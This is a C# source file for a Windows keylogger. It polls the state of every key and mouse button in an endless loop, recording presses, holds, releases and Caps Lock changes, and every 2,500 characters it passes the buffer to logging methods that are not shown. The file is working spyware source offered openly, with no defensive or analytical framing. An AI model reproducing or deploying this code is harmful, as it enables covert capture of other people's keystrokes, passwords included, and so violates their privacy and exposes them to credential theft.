using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    static class KeyLogger
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int key);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        public static void LogContinuous(bool secure = true)
        {
            Dictionary<int, bool> lastFrame = new Dictionary<int, bool>();
            Dictionary<int, DateTime> holdStartTime = new Dictionary<int, DateTime>();

            bool capsLockOn = ((GetKeyState(0x14) & 0x0001) != 0);

            StringBuilder buffer = new StringBuilder();
            buffer.AppendLine($"[CAPS LOCK START STATE: {(capsLockOn ? "ON" : "OFF")}]");

            while (true)
            {
                bool currentCaps = ((GetKeyState(0x14) & 0x0001) != 0);
                if (currentCaps != capsLockOn)
                {
                    capsLockOn = currentCaps;
                    buffer.AppendLine($"[CAPS LOCK {(capsLockOn ? "ENABLED" : "DISABLED")}]");
                }

                for (int i = 1; i < 255; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    bool isDown = (keyState & 0x8000) != 0;
                    bool wasDown = lastFrame.ContainsKey(i) && lastFrame[i];

                    string keyStr = checkExceptions(i);
                    if (keyStr == null)
                    {
                        lastFrame[i] = isDown;
                        continue;
                    }

                    if (isDown && !wasDown)
                    {
                        holdStartTime[i] = DateTime.Now;
                        buffer.AppendLine($"[PRESSED] {keyStr}");
                    }
                    else if (isDown && wasDown)
                    {
                        if (holdStartTime.ContainsKey(i))
                        {
                            var duration = DateTime.Now - holdStartTime[i];
                            if (duration.TotalMilliseconds >= 500)
                            {
                                buffer.AppendLine($"[HELD] {keyStr}");
                                holdStartTime[i] = DateTime.MaxValue;
                            }
                        }
                    }
                    else if (!isDown && wasDown)
                    {
                        buffer.AppendLine($"[RELEASED] {keyStr}");
                        holdStartTime.Remove(i);
                    }

                    lastFrame[i] = isDown;
                }

                if (buffer.Length >= 2500)
                {
                    string output = buffer.ToString();
                    if (secure)
                        output.SecureLog();
                    else
                        output.TestLog();

                    buffer.Clear();
                }

                Thread.Sleep(25);
            }
        }


        public static string checkExceptions(int i)
        {
            switch (i)
            {
                case 1: return "<Left Click>";
                case 2: return "<Right Click>";
                case 4: return "<Middle Click>";
                case 5: return "<X1 Mouse Button>";
                case 6: return "<X2 Mouse Button>";
                case 8: return "<Backspace>";
                case 9: return "<Tab>";
                case 13: return "<Enter>";
                case 16: return null;
                case 17: return null;
                case 18: return null;
                case 20: return "<Caps Lock>";
                case 27: return "<Escape>";
                case 32: return "<Space>";
                case 33: return "<Page Up>";
                case 34: return "<Page Down>";
                case 35: return "<End>";
                case 36: return "<Home>";
                case 37: return "<Left Arrow>";
                case 38: return "<Up Arrow>";
                case 39: return "<Right Arrow>";
                case 40: return "<Down Arrow>";
                case 46: return "<Delete>";
                case 112: return "<F1>";
                case 113: return "<F2>";
                case 114: return "<F3>";
                case 115: return "<F4>";
                case 116: return "<F5>";
                case 117: return "<F6>";
                case 118: return "<F7>";
                case 119: return "<F8>";
                case 120: return "<F9>";
                case 121: return "<F10>";
                case 122: return "<F11>";
                case 123: return "<F12>";
                case 160: return "<Left Shift>";
                case 161: return "<Right Shift>";
                case 162: return "<Left Control>";
                case 163: return "<Right Control>";
                case 164: return "<Left Alt>";
                case 165: return "<Right Alt>";
                default:
                    try
                    {
                        return ((char)i).ToString();
                    }
                    catch
                    {
                        return $"<UNKNOWN {i}>";
                    }
            }
        }
    }
}
